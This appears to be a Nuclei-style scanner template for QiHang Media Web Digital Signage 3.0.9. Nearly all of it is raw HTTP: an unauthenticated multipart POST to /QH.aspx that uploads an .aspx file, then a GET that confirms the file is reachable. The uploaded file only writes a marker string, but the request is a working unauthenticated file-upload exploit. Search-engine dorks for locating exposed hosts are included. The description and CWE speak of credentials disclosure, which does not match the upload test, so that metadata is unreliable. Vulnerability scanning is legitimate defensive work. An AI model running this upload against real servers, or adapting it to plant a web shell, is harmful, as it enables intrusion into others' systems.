http:
- matchers:
  - part: body
    type: word
    words:
    - '{{a2}}'
  raw:
  - 'POST /QH.aspx HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/113.0.5666.197 Safari/537.36

    Accept-Encoding: gzip, deflate

    Accept: */*

    Connection: close

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr

    Content-Length: 1830


    ------WebKitFormBoundaryhbcZX7o0Hw19h3kr

    Content-Disposition: form-data; name="fileToUpload"; filename="{{a1}}.aspx"

    Content-Type: application/octet-stream


    <% response.write ("{{a2}}")%>

    ------WebKitFormBoundaryhbcZX7o0Hw19h3kr

    Content-Disposition: form-data; name="action"


    upload

    ------WebKitFormBoundaryhbcZX7o0Hw19h3kr

    Content-Disposition: form-data; name="responderId"


    ResourceNewResponder

    ------WebKitFormBoundaryhbcZX7o0Hw19h3kr

    Content-Disposition: form-data; name="remotePath"


    /opt/resources

    ------WebKitFormBoundaryhbcZX7o0Hw19h3kr--

    '
  - 'GET /opt/resources/{{a1}}.aspx HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/113.0.5666.197 Safari/537.36

    '
id: qihang-media-unauth-upload
info:
  author: vitasoy
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: "body=\"/images/qihang.ico\" && region=\"Guangdong\"\n--dork-zoomeye\
    \ subdivisions:\"\u5E7F\u4E1C\" +qihang.ico\nQiHang Media Web Digital Signage\
    \ 3.0.9 suffers from a clear-text credentials disclosure vulnerability that allows\
    \ an unauthenticated attacker to issue a request to an unprotected directory that\
    \ hosts an XML file /xml/User/User.xml and obtain administrative login information\
    \ that allows for a successful authentication bypass attack.\n"
  metadata:
    max-request: 1
  name: QiHang Media Web Digital Signage 3.0.9 - unauth upload
  reference:
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5579.php
  severity: critical
  tags: qihang_all,upload,unauth,intrusive
variables:
  a1: '{{rand_base(6)}}'
  a2: '{{randstr}}'
